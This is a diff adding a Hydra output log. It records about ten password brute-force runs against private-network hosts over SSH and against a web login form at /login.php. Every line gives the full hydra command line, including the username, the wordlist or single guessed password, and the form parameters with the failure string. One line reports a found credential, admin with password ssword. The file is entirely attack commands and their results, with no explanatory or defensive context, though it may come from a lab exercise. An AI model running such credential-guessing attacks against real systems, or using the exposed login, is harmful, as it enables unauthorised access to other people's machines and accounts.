@@ -1,0 +1,10 @@
+# Hydra v8.1 run at 2020-01-06 15:21:48 on 172.16.254.113 ssh (hydra -l admin -P 1000-most-common-passwords.txt -o out.txt -f 172.16.254.113 ssh)
+# Hydra v8.1 run at 2020-01-06 16:18:15 on 192.168.100.127 http-post-form (hydra -l admin -P /tmp/1000-most-common-passwords.txt -o out.txt -f 192.168.100.127 http-post-form /login.php:account=^USER^&password=^PASS^:<title>wrong username or password</title>)
+[80][http-post-form] host: 192.168.100.127   login: admin   password: ssword
+# Hydra v8.1 run at 2020-01-06 16:22:53 on 192.168.100.127 ssh (hydra -l admin -P /tmp/1000-most-common-passwords.txt -o out.txt -t 4 192.168.100.127 ssh)
+# Hydra v8.1 run at 2020-01-06 16:31:05 on 192.168.100.127 ssh (hydra -l admin -P /tmp/1000-most-common-passwords.txt -o out.txt -t 4 192.168.100.127 ssh)
+# Hydra v8.1 run at 2020-01-06 16:32:02 on 192.168.100.127 ssh (hydra -l admin -P /tmp/1000-most-common-passwords.txt -o out.txt -t 4 192.168.100.127 ssh)
+# Hydra v8.1 run at 2020-01-07 08:48:44 on 192.168.100.127 ssh (hydra -l root -p 12345678 -o out.txt -t 4 192.168.100.127 ssh)
+# Hydra v8.1 run at 2020-01-07 08:57:14 on 192.168.100.127 ssh (hydra -l root -p 12345678 -o out.txt -f -t 4 192.168.100.127 ssh)
+# Hydra v8.1 run at 2020-01-07 08:59:54 on 192.168.100.127 ssh (hydra -l root -p 12345678 -o out.txt 192.168.100.127 ssh)
+# Hydra v8.1 run at 2020-01-07 17:05:44 on 192.168.100.127 ssh (hydra -l root -p 12345678 -o out.txt -t 4 192.168.100.127 ssh)
